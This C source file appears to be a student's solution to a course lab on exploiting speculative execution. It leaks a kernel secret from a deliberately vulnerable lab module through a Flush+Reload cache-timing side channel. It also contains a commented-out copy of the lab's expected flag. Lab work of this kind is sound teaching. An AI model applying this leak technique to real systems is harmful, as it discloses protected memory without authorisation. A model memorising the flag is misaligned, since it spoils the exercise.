/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

#define NUM_SAMPLES 200
#define DEBUG 0
uint32_t warmup=0;

// char kernel_secret1[LAB2_SECRET_MAX_LEN] = "SecProcs{k3rn3l_m3m0r135}";
/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");
    // for (size_t i = 0; i < 9000; i++)
    // {
    //     (i+1)/(i+99)*33-i;
    // }
    

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
        do {
            size_t times[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};
            size_t min = 1000000000;
            //Flush all shared memory from cache
            for (size_t Samples = 0; Samples < NUM_SAMPLES; Samples++)
            {       
                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
                {
                    clflush(shared_memory+(i*LAB2_PAGE_SIZE));
                }
                call_kernel_part1(kernel_fd, shared_memory, current_offset);
                for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
                {
                    times[i] += time_access(shared_memory+(i*LAB2_PAGE_SIZE));   
                }
            }

            for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
            {
                times[i] = times[i]/NUM_SAMPLES;
                #if DEBUG
                printf("%c: %ld ",i ,times[i]/NUM_SAMPLES);
                if (i % 20 ==0)
                {
                    printf("\n");
                }
                #endif
                if (times[i] < min)
                {
                    min = times[i];
                    leaked_byte = (char) i;
                }
                
            }
            #if DEBUG
            printf("\n\n");
            #endif
            
            // if (kernel_secret1[current_offset] != leaked_byte)
            // {
            //     for (size_t i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++)
            //     {
            //         printf("%c: %ld ",i ,times[i]/NUM_SAMPLES);
            //         if (i % 20 ==0)
            //         {
            //             printf("\n");
            //         }
                    
                    
            //     }
                
            // }

        }while(warmup++ < 15);
        

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
